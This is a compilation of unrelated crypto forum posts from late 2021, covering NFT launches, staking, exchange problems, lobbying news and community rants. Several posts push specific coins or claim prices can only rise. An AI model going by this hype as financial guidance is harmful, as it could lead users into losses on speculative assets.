Then boom, Ive started seeing some secret messages across the Internet  about Iconic Secret, an entirely unique set of Secret NFTs whereby a  series of Twitter Spaces sessions were held, giving participants a  chance to even earn Proof-of-Attendance-Protocol NFTs. To make the run  for decoding whos the artist behind the Iconic Secret, a series of  hints were given. Hints that I had no imagination to decode who was the  artist. It turns out to be Quentin Tarantino. Yes, Tarantino NFTs. This  is super massive for the NFT sector and the news was all over the major  news outlets including CNBC, CNN and others. Quentin Tarantino is no  doubt the GOAT when it comes to screenwriting, directing and filmmaking.   The Tarantino NFTs collection hides secrets from one of the most famous  pieces of artworks in the 1990s known as Pulp Fiction. The interesting  thing is that each NFT contains one or more previously unknown secrets  of a particular iconic scene from Pulp Fiction. One fascinating thing  about the Tarantino NFTs is that the owner will finally have 3 options  at hand, either; to keep the secrets to themselves for eternity, to  share the secrets to a few trusted people or to share the secrets  publicly with the world. Such is the ultimate power of Secret NFTs and  this is so magnificent that fake Tarantino NFTs started going round on  Opensea. Be careful down there, official bidding will be announced soon  and checkout [https://tarantinonfts.com/](https://tarantinonfts.com/).

Secret NFTs are booming and will continue to be because of the technologys unique features of private metadata, private ownership, access control and true randomness. Apart from AnonsNFT and Tarantino NFTs, more Secret NFTs such as Secret Dogs NFT, SCRT Punk NFTs, Secret Underground NFTs and others are pushing to launch.  All these are the NFT part of the Secret Network, not to talk of the DeFi part where lots of powerful developments are also going on. Shade Protocol is among the most anticipated Secret Network ecosystem project. Its an array of connected privacy-preserving DeFi apps. Shade Protocol will launch with Silk which is the first algorithmic stablecoin native to Secret Network with transactional privacy by default while Shade is the native governance token of the Shade Protocol. The Shade token snapshots will begin next week from November 7th  up to December 13th, 2021 and those who stake SCRT ATOM and LUNA prior to or within the snapshots period will receive the airdrop. This is superb.

You know what? I can spend days talking about the dApps and NFTs getting built on the Secret Network ecosystem. And by November 10th, theres going to be the biggest upgrade yet on the Secret Network mainnet. Im talking about the long awaiting Supernova upgrade thats about to make the whole universe of Secret Network explode. This is a major network upgrade that sets the path for Secret Network to be the cross-chain privacy-first platform for Web 3.0. This simply means hundreds of unique use cases for DeFi, NFTs, and even Metaverse will be enabled and explored . Supernovamber as its coined, is an introduction of IBC Integration with Secret Network   connection of Secret Network with top blockchains across the Cosmos ecosystem. This is finally the moment when programmable privacy features will be provided to the entire Cosmos ecosystem. If thats not going to be an explosion, then I have no idea what will be.

Hi everyone, I'm a medical student atm hoping to be a surgeon in the future. For some reason the other day I started thinking about the link between medicine and cryptocurrency and wether there is anything there. I started to think about ways you can use blockchain technology in medicine and actually found a few uses (if you're interested [here's an article](https://doctorpreneurs.com/blockchain-future-healthcare/).) This took me to a further point of thinking whilst browsing the forum. I was wondering how many crypto-investors and fellow redditors actually do something related to crypto and wether they have also thought about the use of blockchain in their area of study/field. 

I feel like it's very fascinating how big the technology is and thinking about this made me realize how huge it will be in the future. We are sooo soo soo early! I can't emphasize this enough. Just the addition of blockchain to the medical field would be huge. Imagine all the other fields and areas that are untouched. This technology is so fascinating and has an unlimited potential of scalability (no pun intended). Can't wait to see what the future holds. Buckle up and enjoy the ride!

Since I dabbled into crypto around february I've been living in the rabbit hole. In this small timeframe I feel like I've gotten at least 5 "Holy shit" moments (realisation of the potential) and everytime I become more and more bullish. What projects that will live on nobody knows - but the potential is inevitable. 

But talking to people I know - and seeing people on this sub have made me question if I'm a small percentage who actually have dug deep down the Crypto Rabbit hole. Most of what I see and hear is talking prices and when to sell or buy - but I feel like I'm one of the only ones who comfortably can say I don't give a crap about the charts - I know this shit is only going one way and that is up.

Crypto *is* the future

Alright so the title says it all actually on my cryptoexchange there are about 80 coins maybe 100 but coins that get named here, that i look up and that have potential aren't on my cryptoexchange. Things like BAT and ERGO it are only the high market cap ones that are listed. I see people posting if this coin gets listed on kraken or binance etc etc.

So here is my question is there a way to buy every coin that exist? or keys or whatever with or without a cryptoexchange?

500 character count sorry for this line hope you have a great day.

Hey guys, 

I sent $171 worth of BUSD (BEP20) from my Trust wallet to my Binance.US account and its not showing up. I sent it to a BEP20 address on Binance itself so Im not sure where I went wrong. It never asked for a memo or anything so Im not sure what Ive done. The txid shows everything is completed and cool, and the binance Wallet address on BSCscan shows its arrived but its not in my binance website balance. What did I do wrong? Is there any recovery? I sent a support ticket to Binance but I dont expect a fast reply.

Here's an article that just posted on Motley Fool Ascent - do you think crypto has done a good job thus far regarding efforts to influence policy?

\++++++++++++++++++++++++++++++++++++++++++

# NYU Public Policy Professor Gives Crypto Industry a Solid 'B' Grade for Recent Lobbying Activities

 by [Tor Constantino](https://www.fool.com/the-ascent/authors/profile/tor-constantino/) | Published on Nov. 5, 2021 

*Blockchain advocates are spending enough and meeting with the right lawmakers, but crypto's complexity requires more effort and education directed toward politicos.*

### Key points

* The cryptocurrency industry spent $2.2 million in lobbying activities in Q3 of this year, double the amount spent in the previous quarter.
* A former congressional staffer turned lobbyist turned NYU professor is impressed with crypto industry ramp-up and momentum.
* While crypto was strong out of the gate in Q3, he says they have to step up educating efforts for policymakers.

Last quarter, [**cryptocurrency**](https://www.fool.com/the-ascent/cryptocurrency/) companies and blockchain industry associations spent around $2.2 million on lobbying both houses of Congress. According to lobbying disclosures, that amount was twice what the crypto industry spent during the second quarter. The digital asset firms mobilized their collective political mojo to fight ill-conceived language that was (and still is) in the languishing trillion-dollar infrastructure bill that was slapdashed together this summer.

## What is driving blockchain-related organizations to lobby so hard?

The two main issues they oppose are vague language around crypto "brokers," which would require onerous transaction reporting requirements on crypto users ranging from individual crypto miners to multi-billion-dollar digital [**exchanges**](https://www.fool.com/the-ascent/cryptocurrency/best-cryptocurrency-apps/). The other deals with amended language are in regard to IRS Title 26, U.S. Code, section 6050I, which states that if someone receives up to $10,000 in cryptos or NFTs, they have 15 days to secure and report all kinds of private info about the sender to the IRS. Both measures seek to syphon digital dollars to offset costs of the infrastructure buildout.

The crypto lobbying collective advanced its opposition by securing meaningful amended language to the respective versions of the bill, but it ultimately fell apart at the last minute. All is not lost, however. First, it's not a certainty that the bill will pass. Second, even if it does, the crypto reporting pieces of the legislation would not take effect until 2024, and due to the strong relationships the crypto lobbyists have established with key congressional members, it's possible that the problematic language could be amended or axed before it kicks in. Based on those efforts and outcomes, I decided to ask an expert to grade crypto's lobbying performance.

## NYU public policy prof gives crypto lobbyists a solid "B" grade

Andrew Barnhill is an assistant professor at NYU Robert F. Wagner Graduate School of Public Service where he's taught public policy for nearly five years. He has 15 years of combined experience in politics and policy, including as a Washington, D.C. lobbyist and congressional staffer. He has also led public policy for multiple companies, and he has two graduate degrees and a law degree from UNC and Duke respectively. He said that crypto made a strong showing in its debut on The Hill.

"I'd give them an 'A' in spending, an 'A' for targeting the correct committee members, a 'B' for presenting a unified front, and I'd give them a 'B-' on education for a total grade of a 'B.' That's solid work for a first time effort under tight time constraints," Barnhill told me during a call. "In fairness it takes awhile to educate on complex topics such as technology and cryptocurrencies. It may take crypto awhile to gain that foothold."

## Where they're doing well and where they need to improve

Barnhill said he liked the fact that the various blockchain associations and crypto companies worked together on this initiative, which he said isn't always the case when competing organizations try to DIY lobbying efforts. He also said they were smart targeting lawmakers with relevant committee assignments and the correct staffers of those lawmakers which Barnhill says demonstrates "... good legwork and strategic thinking."

However, he did say crypto companies need to start creating political action committees (PACs). PACs are necessary to get on the radar and start discussions with more congressional staffers and policymakers because education is going to be critical for crypto to be successful.

"They have a huge lift with education, so they're trying to teach members of Congress and their staffs about this new type of digital currency AND how it's based on blockchain technology. Both those concepts need to be distilled down to the basics of how they work and the benefits they provide. We can see they're trying to do that within the crypto industry, but they need to do more. They've got to really quickly increase the level of literacy among congressional staff members," Barnhill told me.

## Lobbying is not buying votes or favors -- it's building relationships through education and mutual understanding

Educating politicians is one thing, but lobbyists need to also educate the public about their role in the political process. Barnhill stressed that there are a lot of misconceptions about how lobbyists work and get results. "There's this sort of general perception by some of the public that we are buying particular outcomes. Or we are giving money to offices to get their members to vote a certain way, but that's not the case at all, said Barnhill. "What you're doing is spending to try to develop an advocacy campaign that educates and creates subject matter experts among congressional staffers and ultimate policymakers."

He said that education is necessary because politicians are not experts on everything -- they can't be, but yet they're elected to govern over everything on our behalf. We need lawmakers to understand the issues and outcomes of the policies they make. If they don't, that's how bad laws get enacted, and we've seen enough of that from both parties over the past several years.

I've been DCAing into various assets over the past 6 months and have been keeping in all in a simple google sheets template that allowed me to keep track of everything like avg price and profit/loss. This has worked well for the most part but it has become more and more unwieldy as my port has grown, not to mention that it just doesn't accommodate taking profits, as I don't really know what to do with the avg buying price as I DCA out...

Question is, what do you guys use to make this easier? I've been trying the port feature on CoingMarketCap but really not loving of it so far. What is it that you guys all use that makes tracking less of a hassle?

Over the past few days I've noticed an uptick in the amount of people urging others to gamble on shitcoins.  I know I've joked around with things like "YOLO" and such but I've never recommended shitcoins for people to go all in on (I used to use a different account).  I know people are excited about the recent and still current bull run but we need to remember that there are people coming in here looking for legit advice on where to put their money and a significant portion of them are probably putting in more money than they can realistically afford to, despite common sense.

This has been shown by several recent posts by people who have either blasted their crypto into oblivion by hand entering wallet addresses (that person stated they could no afford to lose the money which was lost) or just invested everything they had into the latest celebrity or twitter hyped coin and were now distraught about losing it.  A lot of us are shilling shitcoins and covering our asses by saying DYOR.  That's cool and all but remember going forward that every post that sounds like "whats a good coin" or "how do you find out about new coins", etc...is usually someone with ZERO knowledge and a coinbase account.  A lot of times theyre wanting the big hit and there's a decent chance theyre going to gamble more than they can afford due to all of the hype in media.  We need to all be responsible with them or else they may walk away from crypto after being burned.

I mean, for me at lease, I have held through some very bloody times and have seen my portfolio lose over 60-70% of its value.. but I am still hear, holding the same projects that I held durning those bloody times. The only thing I wish and regret? It would be not investing more into those same exact projects and picking up some that I sadly have now been buying during their runs. 

I know for a lot of people, losing money is terrible and for a lot of people, they need the money they invested. So for them to lose a large % of what they invested during a bear market would be terrible. However, at the same time.. I know that money is made during bear cycles and not bull runs (with the few exceptions of shit coins and such.) To be able to snag ETH or BTC for half of their price currently? **Yes please!** To snag some alts again at their under $1 price tag? Of course I will take that!

I personally have money on the sidelines ready; but am fearful that those "dips" may not occur much longer with large institutions flocking to the scene - crypto is slowly becoming mainstream as well making it potentially harder for projects to see these forms of dips. All in all, I wouldn't be upset or sad about losing money; I would just view it as a prime opportunity to make even more.

I recently watched the Coffeezilla video about the Squid Game rug pull and he brought up some good stuff regarding the media coverage of crypto.

For example, in [this](https://www.bbc.com/news/business-59059097) article by the BBC "Squid Game cryptocurrency rockets in first few days of trading". It starts with "If you're a fan wanting to express your devotion to the hit Korean Netflix show Squid Game - well, there's a cryptocurrency for that." it goes in detail on what the Squid Game token is and about how it has gained a fuck ton. Then at the bottom, it talks about it being sketchy. 

Now, most people don't read the full article when checking out an article. Most skim through it, get a general idea, and move on. Shit, I'm guilty of that sometimes. And that's the issue. The 'Buyer Beware' section of the article should *not* be at the fucking bottom. That should be the first thing you read, not something you have to look for. And the title is just as bad.

Then there's the scumbags on the YouTube like ~~Bitfuck~~ Bitboy who are just shit people out to make money off their viewers. The Save The Kids, Roobets, Dink Doinks, etc. They are shitting in the bed and instead of throwing the sheets away, we're just making the bed. Letting them tarnish crypto and creating the headlines that should be about the good things going on. 

If we look out for the people who aren't as knowledgeable, we will be doing crypto a huge service. Imagine a bank saying, "hey, Mr FBI, I'm pretty sure JP Morgan is laundering money." Or a politician saying, "hey, turns out this new bill coming out will help this company and the creator has a bunch of stock in it." 

We need to spread the word outside of this sub when something isn't right. We may not be specialists in this stuff, but we know enough to warn others when something is fucked. And we need to if we want real adoption anytime soon. 

Rant over.

Hire a financial advisor or an accountant. Join a taxes subreddit. Go vote in your local elections (Im sure most of you didnt in USA). Go write to your local, state, and federal politicians. Start a YouTube channel dedicated to your libertarian ideals or your pro tax ideals. 

But please for the love of all that you find sacred, stop posting about taxes in this subreddit. We can clearly go back and forth about this every moment of everyday, but I dont think this is the time or the place for that discussion. 

If I wanted to read about taxes, I would. But I want to discuss cryptocurrency and its real world use cases. I want to see meme coins pumping. I want to read about people who cant read and bought SQUID. I want to read about why DOT is undervalued. I want the GME/Loopring apes to do their thing. I want to read about why NFTs are scams or why other people think they have value. I want to debate about crypto being a Ponzi scheme or a pyramid scheme. I even want to read moon farming shit posts. 

One thing I really dont want is to read more charged posts about taxes based on your political views and beliefs.

I've been DCAing into various assets over the past 6 months and have been keeping in all in a simple google sheets template that allowed me to keep track of everything like avg price and profit/loss. This has worked well for the most part but it has become more and more unwieldy as my port has grown, not to mention that it just doesn't accommodate taking profits, as I don't really know what to do with the avg buying price as I DCA out...

Question is, what do you guys use to make this easier? I've been trying the port feature on CoingMarketCap but really not loving of it so far. What is it that you guys all use that makes tracking less of a hassle?

There was a post made today complaining about the daily discussion sounding like a bunch of gamblers betting on horses, and it's not like the "good old days". While I think this is an inevitable aspect of of bull market, it would be nice to have a separate more serious discussion channel. 

I like to use the daily chat as it is for merely chatting and speculation, so I don't think we should try to limit it, but it's a shame if useful insight on new developments based on real research is lost in the mass throw away comments. 

I think the best way would be to have a separate daily channel. So we have one where we can air our frustration, or wild predictions, and another where we can get into a real discussion about our blockchain of choice.

Isn't that something? Opened my vault way too late and just recently received my first full month distribution, I'm proud of my tiny handful of MOONS outperforming my heavyweights. 

Frankly whether they go up or down doesn't concern me, but the show they're putting on while I can see them in my possession for the first time is most fun. 

Open those vaults!

I know there is a lot coming down the pipes for C R O. I want to buy in now but hate to buy in at an ATH. Really wishing I would have caught wind sooner. I know realistically that it is highly undervalued at the moment and there is still so much room for it to grow, but just wondering if should buy in now or give it some more time to see where the chips fall. Curious to hear some feedback and get some more insight. What catalysts do you think will get the price moving? Do you think its a relatively safe coin to invest in with current market conditions? Are you going all in right now or are you taking more of a conservative approach?

*Had to repost because it was taken down, so changing my wording. Lol*

First, welcome to all of the newcomers. As a die hard believer in the technology behind cryptocurrency it's great to see people from all backgrounds coming here to learn more. I normally just lurk on Reddit but today I thought I'd share my strategy that has made me 10x returns a few times over in the past year, partly for anyone who cares to read, partly just to verbalize it for myself. 

As a disclaimer: everyone makes money in a bull market. Take everything with a grain of salt. Always be skeptical of internet crusaders giving you advice.

I've developed a few principles that I've stuck to and have been successful for me:

1. Learn the technology. There is a maxim in investing: invest in what you know. Make it your goal to understand the technology behind Crypto. If you're just starting, I recommend podcasts (a16z, Tim Ferriss, Anthony Pompliano) . The more you understand the tech, the more you'll be able to pick winners and more importantly avoid losers
2. Expand your time horizon to 5-10 years AT A MINIMUM. Cryptocurrency will change the very fabric of the way we live and we are still early. Software projects take years to mature and the crypto infrastructure is in its infancy. Invest on the timescale of decades. This has helped me continue to buy through bear markets, and even see 10x returns on a shorter scale.
3. Understand money. Inflation and the utter worthlessness of fiat will be the biggest driver of cryptocurrency value. For this I recommend podcasts and books. 
4. See who else is invested. There's no shame in being a bit late to the party by investing in something that already has a few accredited investors. You're still extremely early relatively. Leverage the DD of people who's job it is to do DD and who know more about the software. 
5. Don't take anything on this sub seriously. I know this may discredit my post, but seriously -- we're all idiots including you.
6. In trying to keep this short(ish), I'll end with this: Listen to the Bears too. I don't agree with the Peter Schiffs but hearing the bear cases from intelligent people is just as important as the bulls. This can all become an echo chamber and if you are really serious about this, you need to hear all cases.

If anyone actually reads this I'm happy to post some of the most helpful articles, books, and podcasts I've found to learn the technology and finance. I am a Computer Engineer and entrepreneur in Crypto and if I need to prove any of this I'm happy to do that as well.

Any new users hunting for new coins to invest in should definitely look into these coins.




1.) Verasity - VRA


2.) Clearpool - CPOOL


3.) Crypto.com coin - CRO


4.) Altura - ALU


5.) Kodi - KODI



Be assured, I'm not posting this randomly to gain some attractions. I've done my research and found them to be good projects with high potentials.



Or you can always get some Safemoons.

Browsing through the comments of a quality crypto Instagrammer's posts, most of the replies are yayyyy I've made onehundredfiftythousand starsurfs from selling water in the desert of XZyzzistan by joining the account. 

The same feeling when get when watching adds on TV 

I actually enjoy adds sometimes. When corporations offer me a product that I enjoy, or would maybe even buy without the ad - why not? It reminds me to stock up on what allows me too enjoy life even more.

This is not what crypto should be about! 

Actually, I'm completely contradicting myself, everyone's trying to promote their own "product" as much as they possibly can - and the required success/effort ratio is probably pretty low. Give 99 people $1 to get $100?

Fuck all of this shit, I'm going back to playing PlayStation - hope you didn't make it this far. 

Football is much easier to deal with. I just try to stay in position and make my team win. Either way, it's fun

I have bought a small cap coin and it did very well. 

Now I want to buy a new small cap coin but it is not listed on cojnmarketcap or coingecko yet. Only on poocoin. I now have experience with how much the price changes and I want to sell when it reaches a certain price. How can I do or know this automatically? I don't want to check the price every minute and you have to be quick with it. How do other people do this? Also, to get this coin I have to trade it on pancake swap so it does not have a very nice way of just selling it. It is a BEP20 token so I assume that in order for me to 'sell' it, I have to just swap it back to BNB and then transfer that BNB somewhere else and sell it there. Am I doing it right?

Any advice is appreciated.

... and I made this post here on r/CryptoCurrency:  

[https://www.reddit.com/r/CryptoCurrency/comments/qia3ri/lets\_talk\_about\_cro\_and\_why\_its\_still\_underpriced/](https://www.reddit.com/r/CryptoCurrency/comments/qia3ri/lets_talk_about_cro_and_why_its_still_underpriced/)

Right now, the current price of CRO is a balmy $0.38183 and holding steady (a 77% rise in one week). Yes, that's in large part due to the decision by Coinbase to list CRO and the associated publicity that Matt Damon's global advertising spot has generated.

But that is only hype and we all know only too well that today's crypto hype is tomorrow's crypto wilderness. Alone and forgotten.

So, why another post about CRO? Because the rise in price is reflecting something FAR more important that hype: fundamentals. On Monday [Crypto.com](https://Crypto.com) is launching cronos and from that moment this coin will become gas - just like BNB.

Cronos:

&gt; Cronos is the EVM chain running in parallel to the Crypto.org Chain. It aims to massively scale the DeFi ecosystem, by providing developers with the ability to instantly port DApps from Ethereum and EVM-compatible chains, with funding from Particle Bs $100m EVM fund and access to the 10M+ user base of the Crypto.com ecosystem. 

I'm not suggesting that CRO is ever going to perform as well as BNB (supply, marketcap, etc), but I do think the new chain is going to be receiving a LOT of attention in the coming weeks and months as (among other things) more than one DEX is going to launch on Cronos.

So .... buckle up and DYOR as always!

BTC is up over 330% on the year. For reference, the DJIA is up a little over 20%.

These holier-than-thou posts about a decentralized utopia tied to your personal politics is cute and all, but pretending that money isnt the primary factor for why were here is patent bullshit for most of us. You win. Youre better than everyone else here.

If you pompous asses build rapture under the sea with your profits, Ill be happy for you. If someone can quit a shit job, pay off their car, or get a first apartment with theirs, we should be happy for them. Stop this pious diatribe every time people that arent you start winning.

From what I've learned about Proof-of-stake networks, it sounds like they are not as hardware- or power-dependent as Proof-of-Work.  I'm curious though - could someone run a demonstration PoS network based out of a single physical server? From a user's perspective, how easily can one tell whether a staking network is made up of multiple independently-run nodes, versus a single machine/single basement?  


Asking mostly out of curiosity, but I also occasionally teach college-level economics and I'm curious whether making a "class pet" virtual crypto network is a viable idea (and what the risk of that project metastasizing into a "real" coin/scam would be).

I like reading crypto threads and everything but lately its some of the most annoying bullshit ever. 
For example:

1.Everyday I see people constantly crying like fucking babies saying Does anybody else get sad that [insert meme coin] is pumping, but mine isnt. Like bro shut the fuck up. Quit whining, your crypto will run eventually! You guys gave shit on meme cryptos and now youre mad they will pump. 

2. People constantly post. What coin hasnt pumped, shill me your coin. How many times can you guys upvote the same shit. EVERYDAY!

You guys are great but Jesus this shit gets repetitive. Sorry for rant, but I have personally have two great questions.


1. Is anybody else sad as fuck that SHIB is pumping and they were too much of a little bitch to join?

2. I follow the masses and I need somebody to tell me which cryptos to invest In. Is SQUID a good one? Its pumping!

Thanks in advance everyone.

Hi guys. 

I currently have my btc secured on a hardware wallet and have no intention of selling most, if not
Any of it for the foreseeable future. 

Instead of leaving it sit there Im thinking why not use it to earn something extra. Iv never done this before so Im interested in opinions.

Im looking into staking on crypto.com and using their Visa card. 

PROS:
Lets say for the purpose of the post I lock in $6000 for 1 year (in 3 month periods at a time)

-I would earn annual interest of $390 (in btc).
-with the card I would get 3% back for each transaction
-I would get free Spotify / Netflix
-free airport lounge access

CONS: 
-btc is locked in for the time period (but doesnt really affect me as I dont plan on using it!

Any suggestions?

Nice, staring to see some parathreads showing up in polkadot.js 

Astar and Litentry are currently onboarding.   There's a couple of crowdloans that are showing up as well but don't have any descriptions to identify what exactly they are.  I've been stacking up dot for the last few weeks waiting for the crowdloans to kick off, so it's awesome to finally see some of this stuff starting to get together.  

Some resources if you're intersted

polkadot.js browser extension [https://polkadot.js.org/extension/](https://polkadot.js.org/extension/)

where to view parathreads and crowdloans [https://polkadot.js.org/apps/#/explorer](https://polkadot.js.org/apps/#/explorer)

how to participate in crowdloans. [https://www.youtube.com/watch?v=YrTxDufrcQM](https://www.youtube.com/watch?v=YrTxDufrcQM)

list of projects [https://parachains.info/](https://parachains.info/)

Lots of debate about which projects are best to contribute your DOT to.  Personally I'm going with Acala as it looks like moonbeam is not an option for me as a US resident.  What projects are you favoring and why?

Weve all see the headlines about KROMER, BABYCATGIRLDOGE and other coins, "$1000 a year ago would be a million Eloncoins today", but to get those gains you'd need to invest really early. Preferably before the Great Collapse heralded by the Second Emu War.

Through this sub we now have also seen what would have happened if you had invested your money into coins like BezosPesos, BEPSI and KurtDisco.

But what would have happened if you tried to invest in the official currency of the world, ElonBallsMusk, before it went up? Then by now you'd definitely be at least a congressman if not a Threshecutioner or at least part of the High Council of Elons. 

So think carefully before you invest in any new cryp... sorry, I meant to say new eloncoins. Please don't hunt me down oh tesla overlords.

Not an financial advice. Maybe. You can do whatever you want.

I study bachelor in economics and today i held a presentation for the whole class on blockchain and crypto currency

Before the presentation my class mates told me they wouldnt understand shit, but I kept the explanations and examples simple and people actually enjoyed it and told me they are going to look into it.

The teacher was hestiant at first, but was thrilled after.

This gave me such a good feeling, and I really think adoption through knowledge and awarness is the way.

Thats it. Have i Nice weekend peeps &lt;3

Im just thinking of transferring **some** of my money  to some stablecoin so I can stake it on exchange.  

So before you start criticizing me please note that I wrote part of my money.

What is the worst thing that can happen to me if I choose a quality stable coin?

I dont mean the one most of you here dont like (T). 

It is obvious that locking your money in a stable coin for a year gives much higher rewards than doing the same thing with banks, some of which give 0.01%. 

But I was thinking, since I learned *"not your keys not your crypto"* there has to be a better way to stake your coins. Like some cold wallets or something like that, just to avoid doing that on exchanges.

Basically I need advice from you guys, I am 100% sure that there is a lot better way to stake my ADA  in some safer way.

Okay so I know we get a good number of people here that are excited on their holdings and seize the opportunity to naturally shill their most favorite coins or over hype a coin to the moon.

How about we twist it up a bit.

I wanted to see what hilarious things people have to say about their own crypto. I believe a healthy sense of humor towards our own coins will help benefit a person by dealing with any downfalls, tough times, hopium addiction, negative arguments over coins, etc. Humor is a powerful tool we fail to use in our arsenal that can help us maintain good health.

Can you describe your favorite coin in the worst way possible?

Feel free to try and guess the coin someone is describing.

Hopefully reddit isn't your crypto news source, although that might account for you losing money a lot. Some friends and I all have our different favorite sites to use for news. Curious to hear other sites I should be following.

I hear everything from CoinTelegraph (which I find biased at times)

Me personally, I like Coindesk (coindesk.com) as they have good opinion articles.

Finance Magnates ([financemagnates.com](https://www.financemagnates.com)) is pretty good too. I found that one using my news reader at www.parareader.com

I have a Burger King very close to my house, so I stopped by on my way home and placed a crypto-eligible order through the app. Shortly thereafter, I received this email:

*"Congratulations! You made an eligible purchase\* to claim a Crypto coin powered by Robinhood. If you are one of the lucky few, you might even earn Bitcoin or Ethereum\*! Claim your reward now."*

When I claimed my reward, I was blessed with ONE WHOLE DOGECOIN. However, apparently it's possible to win Ethereum or Bitcoin as well.

Has anyone here gotten lucky enough to win this large of a prize from a Whopper?

What is the single *best* and the single *worst* thing about your favourite coins? 

One sentence answers only - be honest!

Ill start - My main coins are Bitcoin and Monero:

**Bitcoin**

Best thing - World first revolutionary technology that is changing society as we know it!

Worst thing - Still so slow and expensive to use, so not practical for every day use just yet. 

**Monero**

Best thing - From RandomX to tail emissions, Monero just seems to get everything right!

Worst thing - Its privacy is too good, so it has been delisted on many exchanges - and as a result its price is far lower than it should probably be.

Your turn!

Just a reminder, if you've signed up to be a governor, the voting is going on right now and ends in 9 days. It is moving toward Option B which is the pro-slashing option. If you have not signed up this round, you'll have another chance in a few months.  Don't withdraw your funds from your wallet before the governance period ends or you forfeit your rewards. You still get staking rewards while you are "locked" in for governance. 

Measure #1

Governors should decide between the following two options:

Option A: Keeping the current system. The Governance rewards amount for 2022 will be 282M Algos (70.5M per quarter) while maintaining the current simple locking mechanism: the rewards are distributed among the governors who vote and maintain the committed Algos in their wallet for the entire quarterly period. Governors failing to do so will lose their rewards, but will incur no further penalties.

Option B: Higher rewards and slashing. The Governance rewards amount for 2022 will be 362M Algos (90.5M per quarter) with a slashing mechanism: the rewards are distributed among the governors who vote and maintain the committed Algos in their wallet for the entire quarterly period. In case of failing to do so, Governors will be subject to an 8% slashing of their committed amount, on top of losing their rewards. The penalties that non-compliant governors pay will be returned to the global rewards pool in the AERP, to be used for future rewards.



Results

A. Keeping the current system
34.44%

B. Higher rewards and slashing
65.56%

Maybe this explains the recent pump of LRC.

While it's not the GME announcement we all were anticipating but it's enough to set off a bull run on this coin. 

It's interesting to see where this goes ahead from here, especially if the GME announcement does come through. Regardless, the Q4 announcement of LRC should help push the price further up when it does come out. 

Would love some input from more experienced members as to what should one expect this coin's value to do going forward. 

Note: I have a bias towards LRC since it's my first investment and I've put 100% of my portfolio on it like a fool. 

It's my first post here so in case I've made any mistakes, please point it out. Thanks and happy gains to everyone :)

Why? 
At first it started with only $5 of bitcoin and eventually I started adding more and more as time passed and if I'm being honest, I kind of looked forward to adding to his portfolio every week. Seeing it grow bigger and bigger every week just felt amazing and when the gains started racking in it felt even better knowing that I'm able to benefit someone else that is not me. 


My youngest brother has always been interested in my investments and while hes still not old enough to actually invest I've started a portfolio without telling him. Every week when I dca I always dca for him and while it isnt much, Im hoping itll give him a head start for when hes actually old enough to invest or hell if he wants to cash out as soon as he turns the appropriate age that's up to him but I'll be happy knowing that I was able to help him get a head start in building his life.

At the time of writing this his portfolio is mainly eth/btc and less than 10% being Alt coins. While it definitely is a responsibility playing with others money I feel like this is the safest option when it comes to investing in such a volatile market. Soon I also plan to start staking his eth so he earns a little extra and gets forced diamond hands.

I know most people would usually start a college fund or buy some stocks but I really don't see how this will do any worse than buying all into a vti and the only real way I see this hurting him in the long run is him stressing over what projects to invest in.


Not only that but Ive written and described how to use his wallet address as well as telling him about how to use 2fa and why its important. Ive also been asking him about his grades and when I see he does well in a class Ill put in a little extra. One day I hope to sit him down and explain to him how to use everything as well as the risk that come with investing in crypto but for the meantime, I want him to focus on himself and school. Although I do plan soon on letting him know and try to teach him what crypto is and why it works and why its good. Hopefully he won't grow up to be some low life degenerate and gamble his entire portfolio into coins like squid coin. 

I know that everyone here loves to joke around but crypto is genuinely amazing, it gives people like us a chance at something greater and bigger than ourselves and we get to make money doing so. 

Anyways I hope everyone is having an amazing day and hopefully your coins pump and you get to see 1000x gains in the near future!

ps: drink water and always have 2fa turned on and backup all your passphrases!

Hi, one of the things which I think is extremely concerning is that many central banks are considering introducing digital currencies and in China they already have. This would give the goverment an unprecedented level of control and surveillance over its citizens and they will have the ability to make some of the digital currency have an end date like a month or something; which will only create more mindless consumption and not allow people to save money for their future.

Does anyone else find this concerning and feel its this will make crypto use widespread?

(Before anyone asks yes I do know the goverment can see all my transactions done through my bank and cards already.)

Ill just say each step of the process Id want this to take and if anything is even close to this Id love to hear about it. 

Imagine a program that scans for shitcoins which are less than a month old, and have gone up by &gt;100% in the past 24 hours. Once the program picks up on one of these, it instructs your computer to mine this shitcoin for X minutes. Then your computer returns to mining whatever coin it usually is. Once the shitcoins you mined are worth X dollars or have gone up X% since you mined them, theyre automatically sold. Am I missing something in this strategy or is it basically free money? Btw I have a flat electricity fee so theres literally 0 risk of losing money mining these shitcoins, unless you count losing the time mining eth. 

Is this a thing?

This latest meme coin run has proved that utility comes second when it comes to price movements. You can have a widely adopted coin/token, but if it doesn't have a hyped up name, the price won't move(by a huge %).

As I see it, the big players, such as ETH and BTC are the Microsoft and Apple of the crypto market while all the new meme tokens are penny stocks. The only difference, of course, is that behind a penny stock there is a company doing something, providing a product or service, while meme coins are not really offering much utility. Thoughts?

I think meme making is an interesting thing in regards to crypto, because it feels like an actual way to help your coin beyond just pitching and trying to convince someone to buy it. Not only that, but it's actually fun. I've done it a few times in the past but I usually have only made memes for projects that are already in the billions of dollars so my memes can't claim any credit for doing anything. Did anyone do memes early on a project and you felt like you had more of an impact? Have any of your memes gone into heavy circulation? I think it's pretty safe to say memes are what got the likes of Doge and Shib to the top. Would you consider doing more memes to help pump a project?

Hello fellow members. My name is Anne and I am a Cryptoholic. 

I got into Crypto harmlessly enough with one exchange. Now two months in, I have 5 CEX apps, 4 hot wallets, a Pancakeswap account, gotten 4 family members to the Crypto side, play crypto games to earn crypto, apply for a crypto-based credit card and check Coinmarketcap first thing in the morning and last thing at night. Once I even dream of myself chasing the pump.

I now spend most of my free time shitposting on r/cryptocurrency. I get so addicted to moons that I now have to write this post to harvest some. May the lord has pity on my soul.

Oh Crypto God, grant me the serenity to accept the things I cannot change,
Courage to buy the high and sell the Low, energy to fiat mine and the Wisdom and luck to always invest in the pumping coins. 

Am I doing it right ? I hope fellow members of this club are proud of me.

[Crypto Addiction: A hidden epidemic?](https://www.france24.com/en/live-news/20211104-crypto-addiction-a-hidden-epidemic)

Maybe a new article for the title of: the worst crypto article ever written. This was surely read at least hundred of thousand of times by non-specialists who must now think their friends are addict who are seeing crypto logos floating in the air. We all know the only addiction is ramen and chart watching. 

Today I was looking at my phone and I stumbled upon a notification by the Samsung news service (upday or something like that) It sent me a notification from Boursorama, a famous investment platform in France. 

It was the french version of this article. Here is the English version. This is what they report about, I don't know if this is a way to sell the dude NFTs or just an idiotic reporting from the AFP (Agence France Press( which used to be very very prestigious) ) 

WTF?

I've made the decision to sell all my crypto this year. 

